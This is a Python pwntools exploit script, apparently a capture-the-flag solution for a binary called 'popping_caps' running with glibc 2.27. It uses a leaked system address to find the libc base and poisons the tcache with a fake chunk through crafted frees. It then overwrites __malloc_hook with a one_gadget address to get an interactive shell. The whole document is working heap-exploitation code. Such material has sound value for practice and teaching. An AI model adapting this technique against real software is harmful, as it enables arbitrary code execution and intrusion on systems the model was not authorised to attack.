#!/usr/bin/env python3

from pwn import *

exe = ELF("./popping_caps")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def malloc(size):
    	r.sendline("1")
    	r.sendline(str(size))

    def free(idx):
    	r.sendline("2")
    	r.sendline(str(idx))

    def write(data):
    	r.sendline("3")
    	r.send(data)


    # libc leak
    r.recvuntil("Here is system 0x")
    leak = int(r.recvn(12), 16)
    libc.address = leak - libc.symbols['system']
    log.info("libc base: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook'])))

    one_gadget = libc.address + 0x10a38c

    # NOT APPLICABLE TO FAST BINS, AS IT HAS MORE CHECKS THAN THIS SHIT
    malloc(928) # 1
    free(0) # 2 <- add fake chunk's size ; position influenced by size malloc'd
    free(-528) # 3 <- add fake chunk to tcache bin list
    malloc(0xf0) # 4 <- control fake chunk
    write(p64(libc.symbols['__malloc_hook'])) # 5
    gdb.attach(r)
    malloc(0) # 6
    write(p64(one_gadget)) # 7
    r.interactive()


if __name__ == "__main__":
    main()